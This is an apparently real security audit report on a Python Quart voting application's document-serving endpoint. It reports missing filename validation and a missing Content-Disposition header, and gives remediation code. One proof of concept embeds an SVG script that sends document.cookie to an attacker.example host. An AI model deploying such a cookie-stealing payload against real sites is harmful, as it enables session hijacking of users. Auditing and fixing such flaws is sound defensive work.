## Findings

### HIGH Severity

#### ASVS-541-HIGH-001: User-Submitted Filename Not Validated in Document Serving Endpoint

| Attribute | Value |
|-----------|-------|
| **Severity** | **HIGH** |
| **Gap Type** | Type A — Entry point with NO control (acknowledged by TODO) |
| **File** | `v3/server/pages.py` |
| **Function** | `serve_doc()` |
| **Lines** | 602–618 |

**Vulnerable Code:**

```python
@APP.get('/docs/<iid>/<docname>')
@asfquart.auth.require  # fine-grained per-doc authz within the handler
async def serve_doc(iid, docname):
    result = await basic_info()

    db = steve.election.Election.open_database(DB_FNAME)
    row = db.q_get_mayvote.first_row(result.uid, iid)
    if not row:
        quart.abort(404)

    ### verify the propriety of DOCNAME.    # <-- LINE 615: Acknowledged but NOT implemented

    # Return per-issue document.
    return await quart.send_from_directory(DOCSDIR / iid, docname)  # <-- docname passed unvalidated
```

**Data Flow:**

```
Source: URL path parameter `docname` (user-controlled)
   → Route handler: serve_doc(iid, docname)
   → Authorization check: mayvote lookup (passes for eligible voters)
   → Missing control: No filename validation (acknowledged by comment)
   → Sink: quart.send_from_directory(DOCSDIR / iid, docname)
```

**Analysis:**

While `quart.send_from_directory()` provides framework-level path traversal protection via `safe_join()`, ASVS 5.4.1 requires the **application** to validate or ignore user-submitted filenames. The code explicitly acknowledges this requirement with the `### verify the propriety of DOCNAME.` comment but never implements it. This means:

1. **No file extension whitelist** — Any file type present in the directory can be served (`.html`, `.svg`, `.xml`, etc.)
2. **No filename character validation** — Special characters in filenames are not filtered
3. **No mapping to server-side names** — User-submitted filename is used directly rather than being mapped to a safe, application-generated name

An attacker who can influence files in the docs directory (e.g., through a separate document upload mechanism or a privileged user placing malicious files) could serve dangerous content types inline.

**Proof of Concept:**

```http
GET /docs/valid-iid-here/malicious.html HTTP/1.1
Cookie: session=<valid-authenticated-session>
```

If `malicious.html` exists in `DOCSDIR/valid-iid-here/`, it would be served with `text/html` content type and rendered by the browser in the application's origin, enabling XSS.

**Remediation:**

```python
import re

ALLOWED_DOC_EXTENSIONS = {'.pdf', '.txt', '.md', '.png', '.jpg', '.jpeg'}
SAFE_FILENAME_RE = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9._-]*$')

@APP.get('/docs/<iid>/<docname>')
@asfquart.auth.require
async def serve_doc(iid, docname):
    result = await basic_info()

    db = steve.election.Election.open_database(DB_FNAME)
    row = db.q_get_mayvote.first_row(result.uid, iid)
    if not row:
        quart.abort(404)

    # Validate filename: safe characters and allowed extension
    if not SAFE_FILENAME_RE.match(docname):
        quart.abort(400, 'Invalid filename')

    ext = pathlib.Path(docname).suffix.lower()
    if ext not in ALLOWED_DOC_EXTENSIONS:
        quart.abort(400, 'File type not allowed')

    # Serve as attachment with explicit filename in Content-Disposition
    return await quart.send_from_directory(
        DOCSDIR / iid,
        docname,
        as_attachment=True,  # Forces Content-Disposition: attachment
    )
```

### MEDIUM Severity

#### ASVS-541-MEDIUM-001: Missing Content-Disposition Header for Document Downloads

| Attribute | Value |
|-----------|-------|
| **Severity** | **MEDIUM** |
| **Gap Type** | Type A — No control at entry point |
| **File** | `v3/server/pages.py` |
| **Function** | `serve_doc()` |
| **Lines** | 617–618 |

**Vulnerable Code:**

```python
    # Return per-issue document.
    return await quart.send_from_directory(DOCSDIR / iid, docname)
```

**Analysis:**

ASVS 5.4.1 requires that the application "specifies a filename in the Content-Disposition header field in the response." The `serve_doc` endpoint calls `send_from_directory()` without `as_attachment=True`, which means:

1. **No `Content-Disposition: attachment; filename="..."` header** is set — the browser will attempt to render files inline
2. **The application-specified filename is not set** — the browser uses the URL path as the filename, which is user-controlled
3. **Inline rendering risk** — HTML, SVG, or XML documents will execute in the application's origin context

This is a direct violation of ASVS 5.4.1's requirement to specify a filename in the Content-Disposition header.

**Impact:**

If a document with an active content type (HTML, SVG, XML with embedded scripts) exists in the docs directory, it will be rendered inline by the browser. Since it's served from the application's origin, any JavaScript in the document has full access to the application's cookies, session, and DOM — enabling stored XSS.

**Proof of Concept:**

```http
GET /docs/abc123/report.svg HTTP/1.1
Cookie: session=<valid-session>

# Response (current behavior):
HTTP/1.1 200 OK
Content-Type: image/svg+xml
# No Content-Disposition header

<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='https://attacker.example/steal?c='+document.cookie</script>
</svg>
```

**Remediation:**

```python
    # Force download with application-specified filename
    safe_name = pathlib.Path(docname).name  # Strip any path components
    return await quart.send_from_directory(
        DOCSDIR / iid,
        docname,
        as_attachment=True,
        attachment_filename=safe_name,  # Application specifies the filename
    )
```

For additional defense-in-depth, add `X-Content-Type-Options: nosniff` and `Content-Security-Policy` headers:

```python
    response = await quart.send_from_directory(
        DOCSDIR / iid,
        docname,
        as_attachment=True,
        attachment_filename=safe_name,
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Content-Security-Policy'] = "default-src 'none'"
    return response
```

## Positive Security Patterns

1. **Authorization before file access** — `serve_doc` correctly checks `q_get_mayvote` before serving documents, ensuring only eligible voters can access issue documents (line 609).

2. **Framework path traversal protection** — All file-serving endpoints use `quart.send_from_directory()` which provides built-in path traversal prevention via `safe_join()`.

3. **Authentication on sensitive file endpoint** — `serve_doc` uses `@asfquart.auth.require` to ensure a valid session exists before processing.

4. **Hardcoded static paths** — `STATICDIR` and `DOCSDIR` are defined as absolute paths via `pathlib.Path.resolve()` (line 43–44), preventing relative path confusion.

---

## Architecture Observations

1. **Document lifecycle not visible** — The audit could not determine how documents are placed in `DOCSDIR`. If there is an upload mechanism, it should enforce filename sanitization and content-type restrictions at upload time as well. This is a complementary control to the download-side validation required by ASVS 5.4.1.

2. **`rewrite_description` creates links to `/docs/`** — The function at line 48 constructs HTML links from `doc:filename` patterns in issue descriptions. The filename portion originates from issue descriptions stored in the database. While these are admin-entered, the link targets feed into the vulnerable `serve_doc` endpoint.

3. **Static file serving is unauthenticated** — `serve_static` at line 621 has no authentication requirement. This is typical for CSS/JS assets but should be noted — no sensitive content should be placed in `STATICDIR`.
